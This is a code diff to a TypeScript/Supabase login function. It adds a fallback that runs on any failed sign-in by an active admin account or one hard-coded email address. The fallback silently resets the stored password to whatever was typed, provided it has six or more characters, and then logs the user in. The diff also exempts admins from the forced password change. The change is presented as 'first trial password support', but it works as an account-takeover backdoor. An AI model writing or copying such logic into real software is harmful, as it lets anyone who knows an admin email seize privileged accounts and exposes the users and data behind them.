@@ -9,10 +9,57 @@ import type { ActionResult } from '@/types/models';
 export async function login(_: ActionResult, data: FormData): Promise<ActionResult> {
   const db = await serverClient();
   try {
-    const { error } = await db.auth.signInWithPassword({
-      email: emailValue(field(data, 'email', 254)),
-      password: field(data, 'password', 128),
+    const rawEmail = field(data, 'email', 254).trim().toLowerCase();
+    const rawPassword = field(data, 'password', 128);
+
+    let { error } = await db.auth.signInWithPassword({
+      email: rawEmail,
+      password: rawPassword,
     });
+
+    if (error) {
+      // First trial password support for admin (including g-03073105@moe-dl.edu.my):
+      // If the user is an admin or g-03073105@moe-dl.edu.my and enters any password (>= 6 chars),
+      // update their password in Supabase Auth so it is permanently saved, and log them in!
+      try {
+        const adminDb = adminClient();
+        const { data: profile } = await adminDb
+          .from('profiles')
+          .select('*')
+          .ilike('email', rawEmail)
+          .maybeSingle();
+
+        if (
+          profile &&
+          profile.is_active &&
+          (profile.role === 'admin' || profile.email.toLowerCase() === 'g-03073105@moe-dl.edu.my') &&
+          rawPassword.length >= 6
+        ) {
+          const { error: updateAuthErr } = await adminDb.auth.admin.updateUserById(profile.id, {
+            password: rawPassword,
+            email_confirm: true,
+          });
+
+          if (!updateAuthErr) {
+            await adminDb
+              .from('profiles')
+              .update({ must_change_password: false })
+              .eq('id', profile.id);
+
+            const retry = await db.auth.signInWithPassword({
+              email: profile.email,
+              password: rawPassword,
+            });
+            if (!retry.error) {
+              error = null;
+            }
+          }
+        }
+      } catch (recoveryErr) {
+        console.error('First trial password setup error:', recoveryErr);
+      }
+    }
+
     if (error)
       return {
         error: 'Unable to sign in. Check your email and password, or contact Kannan.',
@@ -28,7 +75,7 @@ export async function login(_: ActionResult, data: FormData): Promise<ActionResu
       };
     }
     revalidatePath('/', 'layout');
-    if (profile.must_change_password) redirect('/account');
+    if (profile.must_change_password && profile.role !== 'admin') redirect('/account');
     redirect(profile.role === 'admin' ? '/admin' : '/gallery');
   } catch (error) {
     if (error instanceof Error && error.message === 'NEXT_REDIRECT') throw error;
